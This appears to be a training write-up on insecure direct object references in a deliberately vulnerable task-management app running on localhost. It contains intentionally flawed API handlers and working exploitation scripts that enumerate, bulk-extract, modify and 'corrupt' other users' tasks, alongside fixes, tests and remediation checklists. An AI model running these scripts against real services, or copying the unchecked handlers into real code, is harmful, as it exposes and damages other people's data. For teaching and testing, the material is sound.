# Insecure Direct Object References (IDOR) (CWE-639)

## Overview

Insecure Direct Object References (IDOR) occur when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability, attackers can bypass authorization and access resources in the system directly, for example, database records or files.

**OWASP Top 10 2021 Ranking**: #1 - Broken Access Control
**CVSS Base Score**: 6.5 - 8.5 (Medium to High)
**Common Attack Vector**: URL Parameters, Form Fields, API Endpoints

## Technical Details

### How IDOR Works

IDOR vulnerabilities occur when:
1. An application uses user-supplied input to access objects directly
2. The application fails to verify that the user is authorized to access the requested object
3. Attackers can manipulate the reference to access unauthorized data

### Common IDOR Scenarios

1. **Direct Database References**: Using database IDs in URLs without authorization checks
2. **File Path References**: Accessing files using user-controlled paths
3. **API Endpoint References**: Accessing API resources without proper ownership validation
4. **Session References**: Accessing other users' sessions or data

### Vulnerability Implementation in Our Application

**Location**: Task management endpoints

```javascript
// VULNERABLE CODE - Task Retrieval
app.get('/api/tasks/:id', authenticateUser, async (req, res) => {
  const { id } = req.params;
  
  try {
    // VULNERABILITY: No ownership verification
    const task = await prisma.task.findUnique({
      where: { id: parseInt(id) },
      include: {
        user: { select: { firstName: true, lastName: true } },
        comments: {
          include: {
            user: { select: { firstName: true, lastName: true } }
          }
        }
      }
    });
    
    if (!task) {
      return res.status(404).json({ error: 'Task not found' });
    }
    
    // VULNERABILITY: Returns task regardless of ownership
    res.json(task);
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

// VULNERABLE CODE - Task Update
app.put('/api/tasks/:id', authenticateUser, async (req, res) => {
  const { id } = req.params;
  const { title, description, priority, status } = req.body;
  
  try {
    // VULNERABILITY: No ownership check before update
    const updatedTask = await prisma.task.update({
      where: { id: parseInt(id) },
      data: { title, description, priority, status },
      include: {
        user: { select: { firstName: true, lastName: true } }
      }
    });
    
    res.json(updatedTask);
  } catch (error) {
    res.status(500).json({ error: 'Failed to update task' });
  }
});

// VULNERABLE CODE - Task Deletion
app.delete('/api/tasks/:id', authenticateUser, async (req, res) => {
  const { id } = req.params;
  
  try {
    // VULNERABILITY: No ownership verification
    await prisma.task.delete({
      where: { id: parseInt(id) }
    });
    
    res.json({ message: 'Task deleted successfully' });
  } catch (error) {
    res.status(500).json({ error: 'Failed to delete task' });
  }
});
```

## Exploitation Techniques

### 1. Sequential ID Enumeration

**Objective**: Access all tasks by incrementing/decrementing task IDs

```bash
# Enumerate tasks by ID
for i in {1..100}; do
  curl -s -H "Authorization: Bearer $TOKEN" \
       "http://localhost:3000/api/tasks/$i" | jq .
done
```

### 2. Bulk Data Extraction

**Objective**: Extract large amounts of data through automated requests

```javascript
// Automated IDOR exploitation script
const axios = require('axios');

async function extractAllTasks(token, maxId = 1000) {
  const tasks = [];
  
  for (let id = 1; id <= maxId; id++) {
    try {
      const response = await axios.get(`http://localhost:3000/api/tasks/${id}`, {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      
      if (response.status === 200) {
        tasks.push(response.data);
        console.log(`Found task ${id}: ${response.data.title}`);
      }
    } catch (error) {
      // Task not found or access denied
      if (error.response?.status !== 404) {
        console.log(`Error accessing task ${id}: ${error.message}`);
      }
    }
  }
  
  return tasks;
}

// Usage
extractAllTasks('your_jwt_token_here').then(tasks => {
  console.log(`Extracted ${tasks.length} tasks`);
  console.log('Sample data:', tasks.slice(0, 3));
});
```

### 3. Cross-User Data Access

**Objective**: Access specific users' data by manipulating object references

```bash
# Access another user's tasks
curl -H "Authorization: Bearer $USER1_TOKEN" \
     "http://localhost:3000/api/tasks/5"  # Task belonging to user2

# Modify another user's task
curl -X PUT -H "Authorization: Bearer $USER1_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"title":"Hacked by User1","status":"COMPLETED"}' \
     "http://localhost:3000/api/tasks/5"

# Delete another user's task
curl -X DELETE -H "Authorization: Bearer $USER1_TOKEN" \
     "http://localhost:3000/api/tasks/5"
```

### 4. Comment System IDOR

**Objective**: Access and manipulate comments across different tasks

```bash
# Access comments from other users' tasks
curl -H "Authorization: Bearer $TOKEN" \
     "http://localhost:3000/api/comments/task/10"

# Delete other users' comments
curl -X DELETE -H "Authorization: Bearer $TOKEN" \
     "http://localhost:3000/api/comments/15"
```

## Step-by-Step Exploitation Tutorial

### Phase 1: Discovery and Reconnaissance

1. **Identify Object References**
   ```bash
   # Login and get your own tasks
   TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
           -H "Content-Type: application/json" \
           -d '{"email":"user1@example.com","password":"password"}' | \
           jq -r '.token')
   
   # Get your tasks to understand ID structure
   curl -H "Authorization: Bearer $TOKEN" \
        "http://localhost:3000/api/tasks" | jq '.[].id'
   ```

2. **Test Basic IDOR**
   ```bash
   # Try accessing a task with different ID
   curl -H "Authorization: Bearer $TOKEN" \
        "http://localhost:3000/api/tasks/1"
   
   # Check response - if successful, IDOR exists
   ```

3. **Determine ID Range**
   ```bash
   # Test various ID ranges to understand system scale
   curl -H "Authorization: Bearer $TOKEN" "http://localhost:3000/api/tasks/1"
   curl -H "Authorization: Bearer $TOKEN" "http://localhost:3000/api/tasks/100"
   curl -H "Authorization: Bearer $TOKEN" "http://localhost:3000/api/tasks/1000"
   ```

### Phase 2: Systematic Enumeration

1. **Automated Task Discovery**
   ```python
   import requests
   import json
   
   def enumerate_tasks(token, start_id=1, end_id=100):
       headers = {'Authorization': f'Bearer {token}'}
       found_tasks = []
       
       for task_id in range(start_id, end_id + 1):
           try:
               response = requests.get(
                   f'http://localhost:3000/api/tasks/{task_id}',
                   headers=headers
               )
               
               if response.status_code == 200:
                   task_data = response.json()
                   found_tasks.append(task_data)
                   print(f"Task {task_id}: {task_data['title']} (Owner: {task_data['user']['firstName']})")
               
           except requests.exceptions.RequestException as e:
               print(f"Error accessing task {task_id}: {e}")
       
       return found_tasks
   
   # Execute enumeration
   token = "your_jwt_token_here"
   tasks = enumerate_tasks(token, 1, 50)
   print(f"Total tasks found: {len(tasks)}")
   ```

2. **Data Classification**
   ```python
   def classify_tasks(tasks):
       classification = {
           'high_priority': [],
           'personal_info': [],
           'business_critical': [],
           'sensitive_content': []
       }
       
       for task in tasks:
           # Classify by priority
           if task.get('priority') == 'HIGH' or task.get('priority') == 'URGENT':
               classification['high_priority'].append(task)
           
           # Look for personal information
           if any(keyword in task.get('description', '').lower() 
                  for keyword in ['password', 'ssn', 'credit card', 'personal']):
               classification['personal_info'].append(task)
           
           # Business critical tasks
           if any(keyword in task.get('title', '').lower() 
                  for keyword in ['budget', 'financial', 'confidential', 'merger']):
               classification['business_critical'].append(task)
       
       return classification
   ```

### Phase 3: Data Extraction and Analysis

1. **Extract Complete Task Data**
   ```bash
   # Create comprehensive data dump
   mkdir idor_extraction
   
   for i in {1..100}; do
     curl -s -H "Authorization: Bearer $TOKEN" \
          "http://localhost:3000/api/tasks/$i" > "idor_extraction/task_$i.json" 2>/dev/null
   done
   
   # Filter successful extractions
   find idor_extraction -name "*.json" -size +10c | wc -l
   ```

2. **Analyze Extracted Data**
   ```python
   import os
   import json
   from collections import defaultdict
   
   def analyze_extracted_data(directory):
       user_data = defaultdict(list)
       sensitive_tasks = []
       
       for filename in os.listdir(directory):
           if filename.endswith('.json'):
               try:
                   with open(os.path.join(directory, filename), 'r') as f:
                       task = json.load(f)
                       
                       if 'user' in task:
                           user_email = task['user'].get('email', 'unknown')
                           user_data[user_email].append(task)
                           
                           # Flag sensitive content
                           if any(keyword in task.get('description', '').lower() 
                                  for keyword in ['confidential', 'secret', 'private']):
                               sensitive_tasks.append(task)
               
               except json.JSONDecodeError:
                   continue
       
       return dict(user_data), sensitive_tasks
   
   users, sensitive = analyze_extracted_data('idor_extraction')
   print(f"Found data for {len(users)} users")
   print(f"Found {len(sensitive)} sensitive tasks")
   ```

### Phase 4: Advanced Exploitation

1. **Cross-User Task Manipulation**
   ```bash
   # Modify other users' tasks
   curl -X PUT -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{
          "title": "COMPROMISED - Original: Important Meeting",
          "description": "This task was modified by an unauthorized user via IDOR vulnerability",
          "priority": "URGENT",
          "status": "CANCELLED"
        }' \
        "http://localhost:3000/api/tasks/15"
   ```

2. **Data Corruption Attack**
   ```python
   import requests
   
   def corrupt_tasks(token, task_ids):
       headers = {
           'Authorization': f'Bearer {token}',
           'Content-Type': 'application/json'
       }
       
       malicious_data = {
           'title': 'SYSTEM COMPROMISED',
           'description': 'All your tasks have been compromised via IDOR vulnerability. Contact security immediately.',
           'priority': 'URGENT',
           'status': 'TODO'
       }
       
       for task_id in task_ids:
           try:
               response = requests.put(
                   f'http://localhost:3000/api/tasks/{task_id}',
                   headers=headers,
                   json=malicious_data
               )
               
               if response.status_code == 200:
                   print(f"Successfully corrupted task {task_id}")
               else:
                   print(f"Failed to corrupt task {task_id}: {response.status_code}")
                   
           except requests.exceptions.RequestException as e:
               print(f"Error corrupting task {task_id}: {e}")
   
   # Execute corruption attack
   target_tasks = [5, 10, 15, 20, 25]  # Tasks belonging to other users
   corrupt_tasks(token, target_tasks)
   ```

## Real-World Examples

### Case Study 1: Facebook Privacy Bug (2018)

**Impact**: 6.8 million users affected
**Attack Vector**: IDOR in photo API
**Data Exposed**: Private photos from users' accounts

**Technical Details**:
- API endpoint used sequential photo IDs
- Missing authorization checks allowed access to any photo
- Attackers could enumerate and download private photos
- Bug existed for 12 days before discovery

### Case Study 2: USPS Informed Delivery (2018)

**Impact**: 60 million users affected
**Attack Vector**: IDOR in account management system
**Data Exposed**: Personal information and mail images

**Technical Details**:
- Account IDs were sequential and predictable
- No authorization checks on account access endpoints
- Attackers could view anyone's mail and personal data
- Simple URL manipulation exposed sensitive information

### Case Study 3: Shopify Partner Dashboard (2020)

**Impact**: Merchant data exposure
**Attack Vector**: IDOR in partner API endpoints
**Data Exposed**: Store analytics and customer information

**Technical Details**:
- Store IDs were predictable integers
- API endpoints lacked proper authorization
- Partners could access other merchants' sensitive data
- Vulnerability allowed competitive intelligence gathering

## Business Impact Assessment

### Financial Impact

| Impact Category | Low Risk | Medium Risk | High Risk | Critical Risk |
|----------------|----------|-------------|-----------|---------------|
| Data Breach | $25K - $100K | $100K - $500K | $500K - $2M | $2M+ |
| Privacy Violations | $10K - $50K | $50K - $200K | $200K - $1M | $1M+ |
| Competitive Loss | $5K - $25K | $25K - $100K | $100K - $500K | $500K+ |
| Regulatory Fines | $10K - $50K | $50K - $250K | $250K - $1M | $1M+ |

### Risk Scenarios

**High-Risk Applications**:
- Healthcare systems with patient records
- Financial applications with account data
- E-commerce platforms with customer information
- Social media platforms with private content
- Business applications with confidential data

**Attack Consequences**:
- Unauthorized data access and theft
- Privacy violations and regulatory breaches
- Competitive intelligence gathering
- Data manipulation and corruption
- Identity theft and fraud
- Business disruption and reputation damage

### Compliance Implications

**Regulatory Standards**:
- **GDPR**: Article 32 - Security of processing
- **HIPAA**: 164.312(a)(1) - Access control
- **PCI DSS**: Requirement 7 - Restrict access by business need
- **SOX**: Section 404 - Internal controls over financial reporting

**Potential Penalties**:
- GDPR: Up to 4% of annual revenue or €20 million
- HIPAA: $100 - $50,000 per violation
- PCI DSS: $5,000 - $100,000 per month
- State privacy laws: Varies by jurisdiction

## Detection Methods

### Automated Testing Tools

1. **Burp Suite Professional**
   ```bash
   # Burp Suite Intruder for IDOR testing
   # Configure payload positions in request
   GET /api/tasks/§1§ HTTP/1.1
   Authorization: Bearer token_here
   
   # Use number payload type with sequential IDs
   # Analyze responses for successful unauthorized access
   ```

2. **OWASP ZAP**
   ```bash
   # ZAP automated IDOR scanning
   zap-baseline.py -t http://localhost:3000 \
                   -r idor-scan-report.html \
                   -c idor-scan-config.conf
   ```

3. **Custom IDOR Scanner**
   ```python
   import requests
   import threading
   from concurrent.futures import ThreadPoolExecutor
   
   class IDORScanner:
       def __init__(self, base_url, token):
           self.base_url = base_url
           self.token = token
           self.headers = {'Authorization': f'Bearer {token}'}
           self.found_objects = []
       
       def test_endpoint(self, endpoint_template, object_id):
           try:
               url = f"{self.base_url}/{endpoint_template.format(id=object_id)}"
               response = requests.get(url, headers=self.headers, timeout=5)
               
               if response.status_code == 200:
                   self.found_objects.append({
                       'id': object_id,
                       'url': url,
                       'data': response.json()
                   })
                   return True
           except:
               pass
           return False
       
       def scan_range(self, endpoint_template, start_id, end_id, threads=10):
           with ThreadPoolExecutor(max_workers=threads) as executor:
               futures = [
                   executor.submit(self.test_endpoint, endpoint_template, obj_id)
                   for obj_id in range(start_id, end_id + 1)
               ]
               
               for future in futures:
                   future.result()
       
       def generate_report(self):
           print(f"IDOR Scan Results: {len(self.found_objects)} objects found")
           for obj in self.found_objects[:10]:  # Show first 10
               print(f"ID {obj['id']}: {obj['url']}")
   
   # Usage
   scanner = IDORScanner('http://localhost:3000/api', 'your_token')
   scanner.scan_range('tasks/{id}', 1, 100)
   scanner.generate_report()
   ```

### Manual Testing Techniques

1. **Parameter Manipulation**
   ```bash
   # Test different parameter values
   curl -H "Authorization: Bearer $TOKEN" "http://localhost:3000/api/tasks/1"
   curl -H "Authorization: Bearer $TOKEN" "http://localhost:3000/api/tasks/2"
   curl -H "Authorization: Bearer $TOKEN" "http://localhost:3000/api/tasks/999"
   
   # Test with different HTTP methods
   curl -X PUT -H "Authorization: Bearer $TOKEN" "http://localhost:3000/api/tasks/1"
   curl -X DELETE -H "Authorization: Bearer $TOKEN" "http://localhost:3000/api/tasks/1"
   ```

2. **Multi-User Testing**
   ```bash
   # Create multiple test accounts
   USER1_TOKEN=$(get_token "user1@test.com" "password")
   USER2_TOKEN=$(get_token "user2@test.com" "password")
   
   # Create task as user1
   TASK_ID=$(curl -X POST -H "Authorization: Bearer $USER1_TOKEN" \
                  -H "Content-Type: application/json" \
                  -d '{"title":"User1 Task","description":"Private task"}' \
                  "http://localhost:3000/api/tasks" | jq -r '.id')
   
   # Try to access as user2
   curl -H "Authorization: Bearer $USER2_TOKEN" \
        "http://localhost:3000/api/tasks/$TASK_ID"
   ```

### Code Review Checklist

- [ ] All object access includes ownership verification
- [ ] User input is validated before database queries
- [ ] Authorization checks are performed at the data layer
- [ ] Object references are not predictable or sequential
- [ ] Access control is consistently applied across all endpoints
- [ ] Indirect object references are used where possible
- [ ] Proper error handling prevents information disclosure
- [ ] Unit tests verify authorization logic

## Prevention Strategies

### 1. Implement Proper Authorization Checks

```javascript
// SECURE CODE - Task Retrieval with Authorization
app.get('/api/tasks/:id', authenticateUser, async (req, res) => {
  const { id } = req.params;
  const userId = req.user.id;
  
  try {
    // SECURITY: Verify ownership before access
    const task = await prisma.task.findFirst({
      where: {
        id: parseInt(id),
        userId: userId  // Ensure user owns the task
      },
      include: {
        user: { select: { firstName: true, lastName: true } },
        comments: {
          include: {
            user: { select: { firstName: true, lastName: true } }
          }
        }
      }
    });
    
    if (!task) {
      return res.status(404).json({ error: 'Task not found' });
    }
    
    res.json(task);
  } catch (error) {
    console.error('Task retrieval error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// SECURE CODE - Task Update with Authorization
app.put('/api/tasks/:id', authenticateUser, async (req, res) => {
  const { id } = req.params;
  const { title, description, priority, status } = req.body;
  const userId = req.user.id;
  
  // Input validation
  if (!title || title.length > 200) {
    return res.status(400).json({ error: 'Invalid title' });
  }
  
  try {
    // SECURITY: Update only if user owns the task
    const updatedTask = await prisma.task.updateMany({
      where: {
        id: parseInt(id),
        userId: userId  // Ownership check
      },
      data: { title, description, priority, status }
    });
    
    if (updatedTask.count === 0) {
      return res.status(404).json({ error: 'Task not found or access denied' });
    }
    
    // Fetch updated task for response
    const task = await prisma.task.findUnique({
      where: { id: parseInt(id) },
      include: {
        user: { select: { firstName: true, lastName: true } }
      }
    });
    
    res.json(task);
  } catch (error) {
    console.error('Task update error:', error);
    res.status(500).json({ error: 'Failed to update task' });
  }
});
```

### 2. Use Indirect Object References

```javascript
// Generate UUIDs instead of sequential IDs
const { v4: uuidv4 } = require('uuid');

// Database schema with UUID
model Task {
  id          String     @id @default(uuid())  // UUID instead of auto-increment
  userId      Int        @map("user_id")
  title       String
  description String?
  // ... other fields
}

// API endpoint using UUID
app.get('/api/tasks/:uuid', authenticateUser, async (req, res) => {
  const { uuid } = req.params;
  const userId = req.user.id;
  
  // Validate UUID format
  const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
  if (!uuidRegex.test(uuid)) {
    return res.status(400).json({ error: 'Invalid task identifier' });
  }
  
  try {
    const task = await prisma.task.findFirst({
      where: {
        id: uuid,
        userId: userId
      },
      include: {
        user: { select: { firstName: true, lastName: true } }
      }
    });
    
    if (!task) {
      return res.status(404).json({ error: 'Task not found' });
    }
    
    res.json(task);
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});
```

### 3. Implement Access Control Middleware

```javascript
// Authorization middleware
const checkTaskOwnership = async (req, res, next) => {
  const { id } = req.params;
  const userId = req.user.id;
  
  try {
    const task = await prisma.task.findFirst({
      where: {
        id: parseInt(id),
        userId: userId
      },
      select: { id: true }  // Only select ID for ownership check
    });
    
    if (!task) {
      return res.status(404).json({ error: 'Task not found or access denied' });
    }
    
    req.task = task;  // Store task reference for use in route handler
    next();
  } catch (error) {
    console.error('Authorization error:', error);
    res.status(500).json({ error: 'Authorization failed' });
  }
};

// Use middleware in routes
app.get('/api/tasks/:id', authenticateUser, checkTaskOwnership, async (req, res) => {
  // Task ownership already verified by middleware
  try {
    const task = await prisma.task.findUnique({
      where: { id: parseInt(req.params.id) },
      include: {
        user: { select: { firstName: true, lastName: true } },
        comments: {
          include: {
            user: { select: { firstName: true, lastName: true } }
          }
        }
      }
    });
    
    res.json(task);
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});
```

### 4. Implement Role-Based Access Control (RBAC)

```javascript
// Enhanced authorization with roles
const checkAccess = (requiredPermission) => {
  return async (req, res, next) => {
    const userId = req.user.id;
    const userRole = req.user.role;
    const { id } = req.params;
    
    try {
      // Admin users have access to all resources
      if (userRole === 'admin') {
        return next();
      }
      
      // Check specific permissions based on resource type
      switch (requiredPermission) {
        case 'task:read':
        case 'task:update':
        case 'task:delete':
          const task = await prisma.task.findFirst({
            where: {
              id: parseInt(id),
              OR: [
                { userId: userId },  // Owner access
                { 
                  // Shared access (if implemented)
                  sharedWith: {
                    some: { userId: userId }
                  }
                }
              ]
            }
          });
          
          if (!task) {
            return res.status(403).json({ error: 'Access denied' });
          }
          break;
          
        default:
          return res.status(403).json({ error: 'Unknown permission' });
      }
      
      next();
    } catch (error) {
      console.error('Access control error:', error);
      res.status(500).json({ error: 'Access control failed' });
    }
  };
};

// Usage in routes
app.get('/api/tasks/:id', authenticateUser, checkAccess('task:read'), taskController.getTask);
app.put('/api/tasks/:id', authenticateUser, checkAccess('task:update'), taskController.updateTask);
app.delete('/api/tasks/:id', authenticateUser, checkAccess('task:delete'), taskController.deleteTask);
```

## Testing Procedures

### Unit Tests

```javascript
describe('IDOR Prevention', () => {
  let user1Token, user2Token, user1Task;
  
  beforeEach(async () => {
    // Create test users and tasks
    user1Token = await createTestUser('user1@test.com');
    user2Token = await createTestUser('user2@test.com');
    
    // Create task as user1
    const response = await request(app)
      .post('/api/tasks')
      .set('Authorization', `Bearer ${user1Token}`)
      .send({
        title: 'User1 Private Task',
        description: 'This should only be accessible by user1'
      });
    
    user1Task = response.body;
  });
  
  test('should prevent unauthorized task access', async () => {
    const response = await request(app)
      .get(`/api/tasks/${user1Task.id}`)
      .set('Authorization', `Bearer ${user2Token}`);
    
    expect(response.status).toBe(404);
    expect(response.body.error).toContain('not found');
  });
  
  test('should prevent unauthorized task modification', async () => {
    const response = await request(app)
      .put(`/api/tasks/${user1Task.id}`)
      .set('Authorization', `Bearer ${user2Token}`)
      .send({
        title: 'Hacked Task',
        description: 'This should not work'
      });
    
    expect(response.status).toBe(404);
  });
  
  test('should prevent unauthorized task deletion', async () => {
    const response = await request(app)
      .delete(`/api/tasks/${user1Task.id}`)
      .set('Authorization', `Bearer ${user2Token}`);
    
    expect(response.status).toBe(404);
  });
});
```

### Integration Tests

```javascript
describe('IDOR Integration Tests', () => {
  test('should maintain authorization across related resources', async () => {
    // Create task and comment as user1
    const taskResponse = await request(app)
      .post('/api/tasks')
      .set('Authorization', `Bearer ${user1Token}`)
      .send({ title: 'Test Task', description: 'Test' });
    
    const commentResponse = await request(app)
      .post(`/api/comments/task/${taskResponse.body.id}`)
      .set('Authorization', `Bearer ${user1Token}`)
      .send({ content: 'Test comment' });
    
    // Try to access comment as user2
    const unauthorizedAccess = await request(app)
      .get(`/api/comments/task/${taskResponse.body.id}`)
      .set('Authorization', `Bearer ${user2Token}`);
    
    expect(unauthorizedAccess.status).toBe(403);
  });
});
```

### Penetration Testing

```bash
#!/bin/bash
# IDOR penetration test script

echo "Starting IDOR penetration test..."

# Test configuration
TARGET_URL="http://localhost:3000/api"
USER1_TOKEN="user1_jwt_token"
USER2_TOKEN="user2_jwt_token"

# Test 1: Create task as user1
echo "Creating task as user1..."
TASK_ID=$(curl -s -X POST "$TARGET_URL/tasks" \
               -H "Authorization: Bearer $USER1_TOKEN" \
               -H "Content-Type: application/json" \
               -d '{"title":"Private Task","description":"Should not be accessible"}' | \
          jq -r '.id')

echo "Created task with ID: $TASK_ID"

# Test 2: Try to access task as user2
echo "Attempting unauthorized access as user2..."
RESPONSE=$(curl -s -w "%{http_code}" -o /tmp/idor_test.json \
                "$TARGET_URL/tasks/$TASK_ID" \
                -H "Authorization: Bearer $USER2_TOKEN")

if [ "$RESPONSE" = "200" ]; then
    echo "VULNERABILITY: IDOR found! User2 can access User1's task"
    cat /tmp/idor_test.json
else
    echo "SECURE: Access properly denied (HTTP $RESPONSE)"
fi

# Test 3: Try to modify task as user2
echo "Attempting unauthorized modification as user2..."
MODIFY_RESPONSE=$(curl -s -w "%{http_code}" -o /tmp/idor_modify.json \
                       -X PUT "$TARGET_URL/tasks/$TASK_ID" \
                       -H "Authorization: Bearer $USER2_TOKEN" \
                       -H "Content-Type: application/json" \
                       -d '{"title":"Hacked!","description":"Unauthorized modification"}')

if [ "$MODIFY_RESPONSE" = "200" ]; then
    echo "VULNERABILITY: User2 can modify User1's task"
else
    echo "SECURE: Modification properly denied (HTTP $MODIFY_RESPONSE)"
fi

# Test 4: Enumerate tasks
echo "Testing task enumeration..."
FOUND_TASKS=0
for i in {1..20}; do
    ENUM_RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null \
                         "$TARGET_URL/tasks/$i" \
                         -H "Authorization: Bearer $USER2_TOKEN")
    
    if [ "$ENUM_RESPONSE" = "200" ]; then
        ((FOUND_TASKS++))
    fi
done

echo "Found $FOUND_TASKS accessible tasks through enumeration"

# Cleanup
rm -f /tmp/idor_test.json /tmp/idor_modify.json

echo "IDOR penetration test completed."
```

## Remediation Checklist

### Immediate Actions (Critical)
- [ ] Implement ownership verification in all object access endpoints
- [ ] Add authorization checks to all CRUD operations
- [ ] Replace sequential IDs with UUIDs where possible
- [ ] Implement proper error handling to prevent information disclosure
- [ ] Add logging for unauthorized access attempts

### Short-term Actions (High Priority)
- [ ] Implement role-based access control (RBAC)
- [ ] Add automated IDOR testing to CI/CD pipeline
- [ ] Create authorization middleware for consistent checks
- [ ] Implement rate limiting to prevent enumeration attacks
- [ ] Add security monitoring and alerting

### Long-term Actions (Medium Priority)
- [ ] Regular penetration testing focused on authorization
- [ ] Security training for development team
- [ ] Implement data classification and access policies
- [ ] Regular security audits and code reviews
- [ ] Establish incident response procedures

## Additional Resources

### Tools and Frameworks
- [Burp Suite](https://portswigger.net/burp) - Web application security testing
- [OWASP ZAP](https://owasp.org/www-project-zap/) - Automated security scanning
- [Postman](https://www.postman.com/) - API testing and automation
- [Insomnia](https://insomnia.rest/) - API client for testing

### Documentation and Standards
- [OWASP Access Control Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- [NIST SP 800-162: Guide to Attribute Based Access Control](https://csrc.nist.gov/publications/detail/sp/800-162/final)

### Training Resources
- [PortSwigger Access Control Labs](https://portswigger.net/web-security/access-control) - Interactive IDOR training
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/) - Hands-on security learning
- [HackTheBox](https://www.hackthebox.eu/) - Practical penetration testing practice

> Prepared by haseeb